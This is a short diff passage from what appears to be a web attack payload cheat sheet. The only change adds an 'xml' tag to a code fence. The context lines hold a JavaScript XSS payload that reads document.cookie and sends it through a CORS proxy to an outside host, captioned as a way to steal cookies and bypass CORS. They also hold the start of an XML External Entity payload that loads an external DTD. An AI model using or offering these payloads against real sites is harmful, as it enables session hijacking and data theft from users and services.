@@ -17,7 +17,7 @@
   - `var url="https://cors-anywhere.herokuapp.com/https://any.host.name/",params="asd="+document.cookie,http=new XMLHttpRequest;http.open("GET",url+"?"+params,!0),http.send(null);` To steal cookies and bypass/beat CORS
 
 * XML External Entity
-```
+```xml
 <?xml version="1.0" ?>
 <!DOCTYPE message [
 <!ENTITY % local_dtd SYSTEM "https://docs.oracle.com/cd/E13153_01/wlcp/wlss40/sip-app_1_0.dtd.txt">
